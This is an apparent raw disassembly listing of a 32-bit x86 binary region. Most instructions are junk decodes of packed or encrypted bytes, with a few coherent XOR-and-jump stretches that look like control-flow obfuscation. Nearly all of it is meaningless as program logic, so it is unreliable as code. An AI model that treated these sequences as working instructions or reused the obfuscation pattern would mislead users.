  4150ec:	shl    DWORD PTR [edx],cl
  4150ee:	push   esp
  4150ef:	sub    bh,ch
  4150f1:	add    BYTE PTR [eax],0x68
  4150f4:	pop    ds
  4150f5:	dec    eax
  4150f6:	mov    esp,0xc1b920dc
  4150fb:	fsub   QWORD PTR [edx-0x2dd5d5ec]
  415101:	add    al,0xad
  415103:	call   0x5dc20319
  415108:	xchg   ebp,eax
  415109:	jne    0x4150b1
  41510b:	retf   
  41510c:	inc    ecx
  41510d:	or     BYTE PTR [ecx-0x53b0efca],0x24
  415114:	or     edx,DWORD PTR [ecx]
  415116:	cli    
  415117:	cdq    
  415118:	jl     0x4150d7
  41511a:	aam    0x6b
  41511c:	adc    ebp,DWORD PTR [eax-0x51]
  41511f:	mov    ds:0x923b4513,al
  415124:	(bad)  
  415125:	lods   al,BYTE PTR ds:[esi]
  415126:	sub    cl,BYTE PTR [ebp+0x18]
  415129:	mov    ?,esi
  41512b:	sbb    DWORD PTR [edi+eiz*1],edi
  41512e:	js     0x4150b0
  415130:	loop   0x415133
  415132:	xchg   ecx,eax
  415133:	jmp    DWORD PTR [ebx-0x67]
  415136:	sar    BYTE PTR [edx],cl
  415138:	cli    
  415139:	nop
  41513a:	mov    eax,ds:0xf425c0df
  41513f:	inc    ebp
  415140:	xor    al,0xad
  415142:	fcom   st(1)
  415144:	mov    al,0x24
  415146:	dec    ebp
  415147:	popa   
  415148:	and    bl,BYTE PTR [esp+eax*8]
  41514b:	mov    dh,0xc4
  41514d:	pushf  
  41514e:	pop    eax
  41514f:	mov    WORD PTR [eax+0x66],es
  415152:	sbb    eax,0x73d49542
  415157:	add    DWORD PTR [edx+0x2ee07c1],ebx
  41515d:	es push ss
  41515f:	push   ecx
  415160:	adc    DWORD PTR [ecx+0x37e76d80],esi
  415166:	loopne 0x4151cb
  415168:	ficomp DWORD PTR [edi-0x3b9b11ca]
  41516e:	sub    DWORD PTR [ebx],esp
  415170:	mov    cl,0x5d
  415172:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415173:	pushf  
  415174:	rcr    DWORD PTR [esi],cl
  415176:	iret   
  415177:	add    al,0x69
  415179:	pop    es
  41517a:	pop    edx
  41517b:	ret    
  41517c:	mul    DWORD PTR [edi+esi*8]
  41517f:	sub    esp,eax
  415181:	mov    DWORD PTR [ebp-0x24],esp
  415184:	mov    eax,DWORD PTR [ebp-0x4]
  415187:	mov    ecx,0x7510855
  41518c:	xor    eax,ecx
  41518e:	mov    edx,0x32729c
  415193:	jmp    0x415477
  415198:	mov    edi,0x35df28be
  41519d:	jne    0x4151f6
  41519f:	pop    esi
  4151a0:	push   ebx
  4151a2:	(bad)  
  4151a3:	fst    DWORD PTR [edi-0x12cebe6f]
  4151a9:	add    eax,0x7eb9707f
  4151ae:	jo     0x415220
  4151b0:	aaa    
  4151b1:	dec    edx
  4151b3:	pop    ds
  4151b4:	jp     0x4151c7
  4151b6:	inc    eax
  4151b7:	out    0xe,eax
  4151b9:	into   
  4151ba:	js     0x4151f5
  4151bc:	mov    al,0xfd
  4151be:	pop    ebp
  4151bf:	cmc    
  4151c0:	add    BYTE PTR ds:0xf8c5e46a,ah
  4151c6:	adc    DWORD PTR [edi],edi
  4151c8:	loop   0x415220
  4151ca:	mov    dl,0x23
  4151cc:	xlat   BYTE PTR ds:[ebx]
  4151cd:	gs aas 
  4151cf:	aaa    
  4151d0:	sahf   
  4151d1:	fwait
  4151d2:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  4151d4:	js     0x41515f
  4151d6:	xchg   ebp,eax
  4151d7:	lahf   
  4151d8:	xchg   BYTE PTR [edi+ebp*8+0x5b],al
  4151dc:	pop    eax
  4151dd:	mov    edi,0xcf6f63f4
  4151e2:	scas   al,BYTE PTR es:[edi]
  4151e3:	mov    ds:0xad1a9f5d,al
  4151e8:	sbb    bl,ah
  4151ea:	jmp    0x3e5:0xba94738a
  4151f1:	jp     0x4151ba
  4151f3:	dec    edi
  4151f4:	fwait
  4151f5:	out    0x5,eax
  4151f7:	xor    ah,BYTE PTR [ebx]
  4151f9:	add    DWORD PTR [esi+0xa],esi
  4151fc:	fisub  WORD PTR ds:0x57b9bc9c
  415202:	pop    eax
  415203:	jb     0x415277
  415205:	pop    eax
  415206:	pop    ecx
  415207:	daa    
  415208:	sub    BYTE PTR [esi+0x29],ah
  41520b:	xor    bl,dh
  41520d:	clc    
  41520e:	add    eax,0xe4d61c8
  415213:	xchg   esp,eax
  415214:	or     BYTE PTR [ecx],0x94
  415217:	imul   edx,DWORD PTR [edi+edx*1],0xffffff90
  41521b:	ret    
  41521c:	fcomp  DWORD PTR [eax-0x36]
  41521f:	push   0xfffffff0
  415221:	dec    esp
  415222:	pop    ebp
  415223:	adc    cl,ah
  415225:	scas   eax,DWORD PTR es:[edi]
  415226:	and    BYTE PTR [eax+0x6237e836],dh
  41522c:	outs   dx,DWORD PTR ds:[esi]
  41522d:	sub    esp,DWORD PTR [esi+0x2b]
  415230:	pop    edx
  415231:	adc    al,0xe5
  415233:	and    BYTE PTR [edi+0x2a],ah
  415236:	es push ebp
  415238:	mov    esp,0xd2968b39
  41523d:	add    BYTE PTR [ebx+ebp*2],ch
  415240:	and    al,0x2b
  415242:	jecxz  0x41521c
  415244:	pop    ebp
  415245:	xor    BYTE PTR [ecx-0x2a],ah
  415248:	retf   
  415249:	out    dx,eax
  41524a:	add    BYTE PTR [eax-0x37122c49],ch
  415250:	loope  0x4151ef
  415252:	test   BYTE PTR [edx],ch
  415254:	lds    edi,FWORD PTR [ebx-0x57]
  415257:	mov    ebp,DWORD PTR [ecx]
  415259:	aaa    
  41525a:	loope  0x415240
  41525c:	sub    al,BYTE PTR ds:0xb7b15b7f
  415262:	adc    eax,0x917ddae
  415267:	add    eax,DWORD PTR [edx+ebx*8+0xe]
  41526b:	(bad)  
  41526c:	sbb    al,0x5c
  41526e:	dec    ecx
  41526f:	in     eax,0xb5
  415271:	fsub   QWORD PTR [edx+0x1]
  415274:	fld    DWORD PTR [esi-0x38]
  415277:	push   ebx
  415278:	xor    si,cx
  41527b:	shl    al,0xec
  41527e:	push   ebp
  41527f:	mov    esi,DWORD PTR [edi+0x3]
  415282:	sub    eax,0xe59366cf
  415287:	or     eax,DWORD PTR [ebx+0x57cae6e9]
  41528d:	mov    edx,0x8cbbcadf
  415292:	xchg   esp,eax
  415293:	xor    bl,dl
  415295:	inc    ebp
  415296:	or     DWORD PTR [edi-0x3f],0xc
  41529a:	push   cs
  41529b:	imul   ebp,edx,0xffffffdf
  41529e:	je     0x4152bc
  4152a0:	pushf  
  4152a1:	call   0xf158:0x35f856d8
  4152a8:	js     0x415319
  4152aa:	jae    0x41523e
  4152ac:	es jp  0x4152c3
  4152af:	mov    bl,0x73
  4152b1:	jmp    0x41530f
  4152b3:	fst    QWORD PTR [edx]
  4152b5:	cmp    BYTE PTR [esi+eiz*2-0xd],0x51
  4152ba:	pop    eax
  4152bb:	dec    edi
  4152bc:	mov    al,0xb8
  4152be:	pop    eax
  4152bf:	dec    eax
  4152c0:	enter  0x680b,0x8c
  4152c4:	mov    eax,ds:0x98b45150
  4152c9:	jne    0x4152d2
  4152cb:	push   es
  4152cc:	inc    ebx
  4152cd:	out    dx,al
  4152ce:	xlat   BYTE PTR ds:[ebx]
  4152cf:	mov    ebp,ds
  4152d1:	xchg   cl,cl
  4152d3:	jecxz  0x41529c
  4152d5:	mov    bl,0xf7
  4152d7:	cmp    bl,dh
  4152d9:	push   ebp
  4152da:	lahf   
  4152db:	push   es
  4152dc:	scas   al,BYTE PTR es:[edi]
  4152dd:	mov    al,ds:0xa2c46e67
  4152e2:	xor    edx,ebp
  4152e4:	mul    edx
  4152e6:	fbstp  TBYTE PTR [ecx+0xf928538]
  4152ec:	inc    edx
  4152ed:	lock sbb ch,BYTE PTR [esi-0x18]
  4152f1:	and    ebx,DWORD PTR [esi+0x448c331c]
  4152f7:	imul   ebx,DWORD PTR [esp+esi*4-0x926b059],0xd320ced
  415302:	or     al,0xfd
  415304:	iret   
  415305:	shl    DWORD PTR [esi+0x2],cl
  415308:	stos   BYTE PTR es:[edi],al
  415309:	cmp    esp,ebp
  41530b:	add    al,0xdc
  41530d:	cmp    bh,BYTE PTR [edx+0x15]
  415310:	(bad)  
  415311:	into   
  415312:	(bad)  
  415313:	das    
  415314:	imul   esp,DWORD PTR [esi],0xf1d09648
  41531a:	adc    al,0x3d
  41531c:	jbe    0x4152c3
  41531e:	adc    eax,0x76a1d44c
  415323:	push   ss
  415324:	lods   eax,DWORD PTR ds:[esi]
  415325:	not    DWORD PTR [ecx-0x5754c0af]
  41532b:	retf   0x744a
  41532e:	icebp  
  41532f:	loope  0x4152dd
  415331:	out    dx,eax
  415332:	and    eax,0xfe95eb9
  415337:	ds pusha 
  415339:	push   0xffffffc4
  41533b:	mov    edx,DWORD PTR [edi+0x45b5f127]
  415341:	in     eax,dx
  415342:	cs nop
  415344:	aam    0x96
  415346:	push   ss
  415347:	fs in  eax,dx
  415349:	mov    esi,ds
  41534b:	shl    ebp,1
  41534d:	push   0xffffff92
  41534f:	push   eax
  415350:	aad    0x25
  415352:	iret   
  415353:	lods   al,BYTE PTR ds:[esi]
  415354:	ret    0xc0ab
  415357:	pushf  
  415358:	mov    ecx,0x7cd7cc04
  41535d:	fs mov dl,0x28
  415360:	sti    
  415361:	cwde   
  415362:	cmp    DWORD PTR [esp+edi*2+0x61],eax
  415366:	pop    ebx
  415367:	jae    0x4153d4
  415369:	cwde   
  41536a:	out    0x6e,eax
  41536c:	imul   ebx,DWORD PTR [ebp+0x4c66fdea],0x59
  415373:	and    eax,0xa35fc1ec
  415378:	dec    esi
  415379:	jbe    0x415364
  41537b:	xor    al,0xea
  41537d:	sbb    DWORD PTR [ecx+0x4b],esi
  415380:	(bad)  
  415381:	cmc    
  415382:	pop    ebp
  415383:	pop    edi
  415384:	data16 add BYTE PTR gs:[edx+ebp*2-0x303f015],ch
  41538d:	icebp  
  41538e:	xor    edi,DWORD PTR ds:0x84dee391
  415394:	mov    esp,0x3b40dda6
  415399:	sub    BYTE PTR [ebx+0x48b656df],al
  41539f:	mov    ecx,0xd0d47ccb
  4153a4:	pushf  
  4153a5:	out    dx,al
  4153a6:	mov    al,ds:0x70581b98
  4153ab:	scas   al,BYTE PTR es:[edi]
  4153ac:	dec    esi
  4153ad:	bound  edi,QWORD PTR [ebx+0x4038f30a]
  4153b3:	mov    BYTE PTR [ebx],dh
  4153b5:	add    BYTE PTR [edi+0x6005ba2f],ah
  4153bb:	inc    eax
  4153bc:	cld    
  4153bd:	gs dec edi
  4153bf:	jmp    0x81ec:0x9493cfcb
  4153c6:	push   ss
  4153c7:	repz cli 
  4153c9:	xchg   edx,eax
  4153ca:	xor    eax,DWORD PTR [ebp+0x6f]
  4153cd:	mov    esp,0x3d6f1911
  4153d2:	inc    edx
  4153d3:	test   eax,0x645b3b4e
  4153d8:	out    0x4d,al
  4153da:	mov    ebx,0x6dd33f63
  4153df:	ds xchg bx,ax
  4153e2:	rol    BYTE PTR ss:[ebx],0x12
  4153e6:	loope  0x4153cf
  4153e8:	mov    eax,ds:0x38614c9
  4153ed:	dec    ecx
  4153ee:	ja     0x41540f
  4153f0:	or     eax,0x11f4a875
  4153f5:	imul   edx,DWORD PTR ds:0x24eff86e,0x4af94d97
  4153ff:	jnp    0x41546a
  415401:	inc    ebx
  415402:	jno    0x41540e
  415404:	retf   
  415405:	mov    edi,0xd6ae51e5
  41540a:	adc    al,0xd7
  41540c:	ss pop ds
  41540e:	cmp    DWORD PTR [edi+0x7f],edi
  415411:	adc    ah,BYTE PTR cs:[eax-0x10591c7c]
  415418:	das    
  415419:	cmp    ah,BYTE PTR [ebp-0x4f]
  41541c:	mov    BYTE PTR [ecx],dl
  41541e:	outs   dx,BYTE PTR ds:[esi]
  41541f:	imul   esp,edi,0xd9482ace
  415425:	xchg   ebp,eax
  415426:	shl    eax,0xf5
  415429:	cmp    eax,0xc5e81b20
  41542e:	leave  
  41542f:	stos   DWORD PTR es:[edi],eax
  415430:	out    0x65,eax
  415432:	(bad)  
  415433:	mov    ds:0x3d5304d,al
  415438:	jo     0x4153cc
  41543a:	sub    bh,BYTE PTR [esi]
  41543c:	jle    0x415400
  41543e:	ds iret 
  415440:	adc    al,0xcc
  415442:	aad    0x9
  415444:	aas    
  415445:	sub    DWORD PTR [edi+0x11],esp
  415448:	push   ds
  415449:	out    dx,eax
  41544a:	and    ch,dh
  41544c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41544d:	rcl    DWORD PTR [ebx],1
  41544f:	mov    WORD PTR [ecx-0x8],cs
  415452:	sub    al,0x75
  415454:	loopne 0x4154a5
  415456:	(bad)  
  415457:	cwde   
  415458:	(bad)  
  415459:	rcl    ch,0xb4
  41545c:	je     0x415465
  41545e:	fs inc ebx
  415460:	push   edi
  415461:	ffree  st(2)
  415463:	mov    ah,0xe0
  415465:	xchg   BYTE PTR [esi-0xd43ae0d],dh
  41546b:	cmp    eax,0x5c8cb580
  415470:	mov    edi,DWORD PTR [edx]
  415472:	fcmovnbe st,st(7)
  415474:	mov    esp,0xc2035107
  415479:	mov    DWORD PTR [ebp+0x8],eax
  41547c:	mov    eax,DWORD PTR [ebp-0x18]
  41547f:	xor    eax,ecx
  415481:	add    eax,edx
  415483:	mov    edx,DWORD PTR [ebp+0x14]
  415486:	imul   eax,DWORD PTR [edx]
  415489:	mov    edx,DWORD PTR [ebp-0x4]
  41548c:	xor    edx,ecx
  41548e:	mov    ecx,DWORD PTR [ebp+0x8]
  415491:	lea    ecx,[edx+ecx*1+0x32729c]
  415498:	cmp    ecx,eax
  41549a:	je     0x416385
  4154a0:	mov    edi,DWORD PTR [ebp-0x18]
  4154a3:	mov    eax,DWORD PTR [ebp+0x8]
  4154a6:	mov    edx,DWORD PTR [ebp+0x14]
  4154a9:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4154ad:	mov    ecx,0x7510855
  4154b2:	xor    edx,edx
  4154b4:	xor    edi,ecx
  4154b6:	jmp    0x41579a
  4154bb:	sub    dh,cl
  4154bd:	sub    BYTE PTR [ecx+0x71b159f7],bl
  4154c3:	xchg   esi,edx
  4154c5:	push   ebx
  4154c6:	mov    ch,0x83
  4154c8:	sub    dl,BYTE PTR [edi]
  4154ca:	push   edi
  4154cb:	add    bh,BYTE PTR ss:[edi+0x70]
  4154cf:	mov    ecx,0x2a70707e
  4154d4:	rcl    bh,1
  4154d6:	sub    ch,BYTE PTR [ebp+0x33d824da]
  4154dc:	push   ecx
  4154dd:	push   edx
  4154de:	sar    bl,1
  4154e0:	fdivr  st,st(4)
  4154e2:	and    al,0xef
  4154e4:	popf   
  4154e5:	jmp    0x5bcb27c
  4154ea:	in     al,0xa8
  4154ec:	inc    ebx
  4154ed:	enter  0x1dbb,0x27
  4154f1:	cmc    
  4154f2:	add    ch,BYTE PTR [edi-0x379f9ec]
  4154f8:	sbb    BYTE PTR [ebx+ecx*1-0x64],bl
  4154fc:	test   al,0xdc
  4154fe:	push   es
  4154ff:	mov    edi,0x9f38ca58
  415504:	cld    
  415505:	and    ecx,DWORD PTR [ebx+edx*8]
  415508:	ret    0x77e2
  41550b:	rcr    DWORD PTR [eax+0x5a469b6e],cl
  415511:	push   esp
  415512:	cs pop edx
  415514:	adc    al,0xcb
  415516:	and    al,0x9e
  415518:	fcmovu st,st(6)
  41551a:	xor    eax,0xf448f44c
  41551f:	outs   dx,BYTE PTR ds:[esi]
  415520:	xchg   ebp,eax
  415521:	ret    
  415522:	and    dh,al
  415524:	fcomp  QWORD PTR [esi-0x52]
  415527:	cmp    DWORD PTR [eax-0x7fe7f377],ecx
  41552d:	sti    
  41552e:	or     eax,0x2b6d8a77
  415533:	ins    BYTE PTR es:[edi],dx
  415534:	scas   eax,DWORD PTR es:[edi]
  415535:	dec    ebx
  415536:	mov    esp,0xe7285e65
  41553b:	fidivr WORD PTR [ecx]
  41553d:	stc    
  41553e:	inc    eax
  41553f:	pop    es
  415540:	fist   DWORD PTR [edx+0x4b6486c8]
  415546:	add    eax,0x5d97eb61
  41554b:	mov    ecx,0x9e2f8a59
  415550:	push   edi
  415551:	push   edx
  415552:	push   ebx
  415553:	loop   0x415520
  415555:	mov    bh,0xdb
  415557:	xor    eax,0x4a8ed800
  41555c:	and    eax,0x74bd64c1
  415561:	mov    edx,0x7d1a47fc
  415566:	sbb    eax,0x690b5a5f
  41556b:	rol    ch,cl
  41556d:	loopne 0x4155e8
  41556f:	int    0x32
  415571:	jne    0x4155cf
  415573:	cmp    DWORD PTR [esi+ebp*2-0x12],esp
  415577:	or     ebx,DWORD PTR [eax+0x7c1e2110]
  41557d:	jp     0x4155ba
  41557f:	inc    eax
  415580:	fcom   QWORD PTR [eax+0x59b547f0]
  415586:	mov    ds:0x984d9751,eax
  41558b:	sbb    BYTE PTR [ecx+0x1b],cl
  41558e:	retf   0xc355
  415591:	or     DWORD PTR [ecx-0x7b],ecx
  415594:	mov    ah,0x4e
  415596:	mov    ds:0x657f2fc,eax
  41559b:	or     ebp,edi
  41559d:	xor    esi,DWORD PTR [ebx+0x68c58b27]
  4155a3:	mov    eax,DWORD PTR [ebx]
  4155a5:	cmp    al,0x1c
  4155a7:	in     eax,0x12
  4155a9:	dec    ebx
  4155aa:	push   esi
  4155ab:	loope  0x41561f
  4155ad:	mov    esp,0xef814479
  4155b2:	idiv   BYTE PTR [esp+edi*8]
  4155b5:	cmp    ch,BYTE PTR [ebx+0x1287cd4f]
  4155bb:	ror    BYTE PTR [ecx],1
  4155bd:	xchg   ebx,eax
  4155be:	add    eax,0x35de2be4
  4155c3:	inc    esi
  4155c4:	or     eax,0x6824b588
  4155c9:	xor    DWORD PTR [ebx],ebp
  4155cb:	repz add BYTE PTR [edi],al
  4155ce:	popf   
  4155cf:	push   esp
  4155d0:	jns    0x4155af
  4155d2:	mov    dl,0xa3
  4155d4:	das    
  4155d5:	push   0xe8b540f4
  4155da:	lock or al,bl
  4155dd:	mov    al,ds:0xc77bb894
  4155e2:	neg    DWORD PTR [esi]
  4155e4:	int    0x62
  4155e6:	(bad)  
  4155e7:	cmp    DWORD PTR [edx+0x70],ebx
  4155ea:	dec    eax
  4155eb:	push   ebx
  4155ec:	int3   
  4155ed:	dec    ecx
  4155ee:	repnz leave 
  4155f0:	sbb    eax,edx
  4155f2:	jne    0x4155f4
  4155f4:	inc    eax
  4155f5:	int3   
  4155f6:	ins    BYTE PTR es:[edi],dx
  4155f7:	fldenv [esi-0x4cd6b335]
  4155fd:	in     eax,0x40
  4155ff:	mov    bh,0x4c
  415601:	pop    ds
  415602:	xchg   ebp,eax
  415603:	sbb    cl,BYTE PTR [esi+0x7545883e]
  415609:	add    eax,0xbcfca497
  41560e:	pop    es
  41560f:	leave  
  415610:	adc    DWORD PTR [esi+0x3e],ebx
  415613:	dec    ebp
  415614:	fdiv   QWORD PTR [ecx]
  415616:	in     al,0x23
  415618:	mov    dl,0x31
  41561a:	cmc    
  41561b:	lods   al,BYTE PTR ds:[esi]
  41561c:	push   esi
  41561d:	sbb    BYTE PTR [ecx],al
  41561f:	rol    BYTE PTR [esi+edi*4],cl
  415622:	leave  
  415623:	sub    DWORD PTR [edi-0x2517cca9],edx
  415629:	jl     0x4155bf
  41562b:	push   cs
  41562c:	or     eax,0x85e78320
  415631:	int3   
  415632:	mov    esi,0x861c033f
  415637:	call   0x21ef:0x13f93819
  41563e:	loopne 0x4156be
  415640:	adc    eax,0x54612d85
  415645:	ins    DWORD PTR es:[edi],dx
  415646:	test   eax,0xd919d094
  41564b:	sbb    ebx,edi
  41564d:	je     0x415694
  41564f:	aam    0x4c
  415651:	jg     0x41565c
  415653:	xchg   ebp,eax
  415654:	jl     0x415609
  415656:	mov    esi,0x5a718cda
  41565b:	(bad)  
  41565c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41565d:	(bad)  
  41565f:	leave  
  415660:	or     bh,BYTE PTR [edi-0x237a807e]
  415666:	retf   
  415667:	(bad)  
  415668:	mov    esi,0xddcd0a43
  41566d:	dec    ebx
  41566e:	das    
  41566f:	cmp    bl,dh
  415671:	and    BYTE PTR [ebx+0x2f],al
  415674:	xor    BYTE PTR [ecx],dh
  415676:	pop    DWORD PTR [eax+0x643f40e0]
  41567c:	sbb    eax,0x40f2de60
  415681:	retf   0x2288
  415684:	jl     0x4156a6
  415686:	jl     0x4156e0
  415688:	and    BYTE PTR [esp+ecx*4-0x3e3bf440],0xfb
  415690:	mov    esi,0x6b15518a
  415695:	test   BYTE PTR [ecx],0xae
  415698:	mov    cl,0x42
  41569a:	jns    0x4156dc
  41569c:	and    bl,BYTE PTR [ebx-0x4ab3d5e4]
  4156a2:	mov    dh,dl
  4156a4:	sub    BYTE PTR [esi+0x50],bh
  4156a7:	inc    ebp
  4156a8:	ror    BYTE PTR [eax],1
  4156aa:	xor    ah,cl
  4156ac:	sub    al,0xee
  4156ae:	ja     0x4156cf
  4156b0:	inc    esp
  4156b1:	mov    esi,0x2e069184
  4156b6:	or     esp,esi
  4156b8:	into   
  4156b9:	sbb    al,0x1f
  4156bb:	jmp    0x41571a
  4156bd:	gs out dx,al
  4156bf:	fisttp DWORD PTR [esi-0x73]
  4156c2:	sub    dh,al
  4156c4:	and    DWORD PTR [ecx-0x38bb4ee1],edx
  4156ca:	mov    dh,0x5d
  4156cc:	and    ch,BYTE PTR [ebx]
  4156ce:	cmp    eax,DWORD PTR [ecx+edi*2+0x1708537a]
  4156d5:	enter  0x975b,0xb0
  4156d9:	xor    bh,ah
  4156db:	stos   DWORD PTR es:[edi],eax
  4156dc:	add    BYTE PTR [edi-0x44],0x32
  4156e0:	imul   eax,DWORD PTR ds:0x8855ce3a,0xd6df7e61
  4156ea:	les    ecx,FWORD PTR [ecx+ebp*4-0x6008d80e]
  4156f1:	jmp    0x147031a2
  4156f6:	test   DWORD PTR [ecx-0x8],0xe97cd7fc
  4156fd:	test   BYTE PTR [ebx],0x48
  415700:	jne    0x41568f
  415702:	sub    dl,0xe2
  415705:	loopne 0x41571e
  415707:	int3   
  415708:	loope  0x4156a8
  41570a:	shr    BYTE PTR [ebp-0x4f259fd0],0x96
  415711:	pushf  
  415712:	mov    esi,0x2ea53204
  415717:	push   esp
  415718:	movhps xmm7,QWORD PTR ss:[eax]
  41571c:	sub    ebx,DWORD PTR ss:[ebx+esi*4-0x3eabfeef]
  415724:	pop    ebp
  415725:	ret    
  415726:	jl     0x415749
  415728:	cmp    al,0xb9
  41572a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41572b:	fiadd  DWORD PTR [edx+0x1e]
  41572e:	in     eax,0x78
  415730:	loope  0x415773
  415732:	imul   esp,DWORD PTR [ecx+edx*8+0x57],0xddb7219
  41573a:	inc    ebx
  41573b:	xchg   esp,eax
  41573c:	inc    edi
  41573d:	sahf   
  41573e:	mov    edx,0x198fd106
  415743:	mov    esi,0xd7353a3c
  415748:	xor    cl,0x29
  41574b:	sbb    eax,0xe426fd54
  415750:	test   DWORD PTR [ebp+0x4a],esp
  415753:	xor    bh,BYTE PTR [edi-0x1060d388]
  415759:	inc    ebx
  41575a:	aas    
  41575b:	xchg   ebx,eax
  41575c:	aam    0x45
  41575e:	cli    
  41575f:	int    0xa2
  415761:	sbb    eax,0x4e5227b2
  415766:	dec    esp
  415767:	inc    esp
  415768:	dec    esi
  415769:	jno    0x41574e
  41576b:	push   ebp
  41576c:	jl     0x415723
  41576e:	mov    ebp,0x847798a9
  415773:	pop    ebx
  415774:	push   esi
  415775:	mov    ah,0xa6
  415777:	cmp    BYTE PTR [esi+0x452c97eb],0xcd
  41577e:	mov    ecx,0x6a2b1b45
  415783:	pop    edx
  415784:	mov    BYTE PTR [ecx],dl
  415786:	and    edi,DWORD PTR [eax+0x1d267a4d]
  41578c:	popa   
  41578d:	or     edx,DWORD PTR [esp+eax*8]
  415790:	mov    esi,0xd895ff4f
  415795:	xor    al,0x9e
  415797:	jnp    0x415777
  415799:	out    dx,al
  41579a:	mov    esi,0x32729c
  41579f:	add    edi,esi
  4157a1:	div    edi
  4157a3:	mov    edx,DWORD PTR [ebp-0x4]
  4157a6:	jmp    0x415a8a
  4157ab:	adc    al,0xcd
  4157ad:	inc    esi
  4157ae:	rol    BYTE PTR [ecx+0x51],cl
  4157b1:	xchg   esp,eax
  4157b2:	int    0x7b
  4157b4:	rcl    DWORD PTR [esi],1
  4157b6:	test   bl,dl
  4157b8:	mov    esi,0xf7f839d
  4157bd:	jg     0x41582f
  4157bf:	mov    ecx,0x8870707e
  4157c4:	push   0xe788ad29
  4157c9:	clc    
  4157ca:	mov    dl,0xb6
  4157cc:	jecxz  0x41580f
  4157ce:	ds push ebx
  4157d0:	cmp    DWORD PTR [ebx-0x3361f454],esi
  4157d6:	jecxz  0x415818
  4157d8:	jb     0x4157d7
  4157da:	pop    ecx
  4157db:	xchg   ecx,eax
  4157dc:	xor    BYTE PTR [edx-0x20],ah
  4157df:	xor    dl,BYTE PTR [ebx-0x1]
  4157e2:	push   ss
  4157e3:	aam    0x2e
  4157e5:	loop   0x415824
  4157e7:	rcr    DWORD PTR [edx],1
  4157e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4157ea:	stos   BYTE PTR es:[edi],al
  4157eb:	cmp    ch,BYTE PTR [esi-0x5de1cbe3]
  4157f1:	adc    esp,DWORD PTR [ebx+0x61]
  4157f4:	fld    QWORD PTR [esi-0x4a]
  4157f7:	mov    ebp,esp
  4157f9:	idiv   dh
  4157fb:	popa   
  4157fc:	int    0x66
  4157fe:	sahf   
  4157ff:	js     0x41584b
  415801:	cdq    
  415802:	out    0x56,eax
  415804:	int    0xdb
  415806:	clc    
  415807:	mov    cl,BYTE PTR [ebx+0x2]
  41580a:	lds    ecx,FWORD PTR [edi-0x4a1754]
  415810:	sti    
  415811:	xchg   esp,eax
  415812:	cdq    
  415813:	mov    ch,0x24
  415815:	add    eax,0x7c2c05f2
  41581a:	push   ebx
  41581b:	aaa    
  41581c:	test   ebx,eax
  41581e:	int    0xdb
  415820:	fisub  WORD PTR [edi]
  415822:	pop    ss
  415823:	repz (bad)
  415826:	cmp    eax,0xb6d3266c
  41582b:	xchg   ecx,eax
  41582c:	outs   dx,BYTE PTR ds:[esi]
  41582d:	out    0x95,al
  41582f:	sub    dh,BYTE PTR gs:[ebx-0x14e5a8bd]
  415836:	or     DWORD PTR [esi+eax*1-0x6b2d257c],esi
  41583d:	mov    ecx,0x5215e85f
  415842:	adc    ah,BYTE PTR [esi+esi*4-0x5c]
  415846:	stc    
  415847:	loope  0x415847
  415849:	jecxz  0x4158b3
  41584b:	adc    dh,BYTE PTR [esi+0x0]
  41584e:	pop    ecx
  41584f:	sub    cl,dl
  415851:	data16 fwait
  415853:	ds fs push cs
  415856:	jnp    0x4157ec
  415858:	inc    esp
  415859:	popf   
  41585a:	lods   al,BYTE PTR ds:[esi]
  41585b:	data16 arpl sp,bp
  41585e:	lock test DWORD PTR [ebx-0x46546b05],ecx
  415865:	out    dx,al
  415866:	push   cs
  415867:	cld    
  415868:	xor    eax,0x6d1d7be7
  41586d:	in     al,dx
  41586e:	(bad)  [edi+0x20]
  415871:	push   0xdb7bbd02
  415876:	dec    ecx
  415877:	imul   edi,DWORD PTR [esi+0x298153b4],0x5a
  41587e:	mov    ecx,0x6175cbd1
  415883:	xor    BYTE PTR [edi],al
  415885:	inc    edi
  415886:	jae    0x415895
  415888:	jb     0x41588f
  41588a:	mov    bh,0xd4
  41588c:	jl     0x4158fa
  41588e:	test   eax,0x69bb3c0c
  415893:	in     al,0xd9
  415895:	push   ss
  415896:	inc    ebx
  415897:	inc    esi
  415898:	push   es
  415899:	retf   0xbad0
  41589c:	inc    edi
  41589d:	jmp    0x41583e
  41589f:	or     BYTE PTR [eax+0x2aa6e96b],dl
  4158a5:	pop    ecx
  4158a6:	mov    eax,ds:0x7ffd9e8a
  4158ab:	aaa    
  4158ac:	mov    WORD PTR [ecx+0x202833e4],es
  4158b2:	mov    BYTE PTR [edx],0x77
  4158b5:	cld    
  4158b6:	or     al,0x57
  4158b8:	nop
  4158b9:	das    
  4158ba:	shl    DWORD PTR [edi-0x5a],0x62
  4158be:	call   0x9a41:0x8a714cfd
  4158c5:	lea    esi,[edi+0x692f641]
  4158cb:	adc    dh,ah
  4158cd:	icebp  
  4158ce:	inc    edx
  4158cf:	or     DWORD PTR [edi],esp
  4158d1:	repnz aam 0x6c
  4158d4:	mov    bh,0xe6
  4158d6:	sub    ch,ch
  4158d8:	ss adc al,0x8b
  4158db:	imul   ebx,esp,0x3721aeff
  4158e1:	(bad)  
  4158e2:	xchg   ecx,eax
  4158e3:	fdivr  QWORD PTR [edi+0x7b508928]
  4158e9:	pop    esp
  4158ea:	dec    eax
  4158eb:	out    dx,al
  4158ec:	mov    cl,0xe6
  4158ee:	dec    esp
  4158ef:	call   0xdf766ed1
  4158f4:	jl     0x41592b
  4158f6:	inc    ecx
  4158f7:	test   eax,0x315fee49
  4158fc:	in     al,0xf7
  4158fe:	popa   
  4158ff:	pushf  
  415900:	jbe    0x415907
  415902:	or     DWORD PTR [edx+0x3b],edx
  415905:	sti    
  415906:	int    0xa8
  415908:	mov    ah,0xed
  41590a:	jae    0x41591b
  41590c:	scas   al,BYTE PTR es:[edi]
  41590d:	mov    esp,DWORD PTR ds:0x16e54207
  415913:	leave  
  415914:	pop    ebp
  415915:	push   ecx
  415916:	leave  
  415917:	repnz dec ebx
  415919:	cmp    al,0xf9
  41591b:	pop    edx
  41591c:	adc    DWORD PTR [esi+0x34be85ee],esp
  415922:	scas   al,BYTE PTR es:[edi]
  415923:	das    
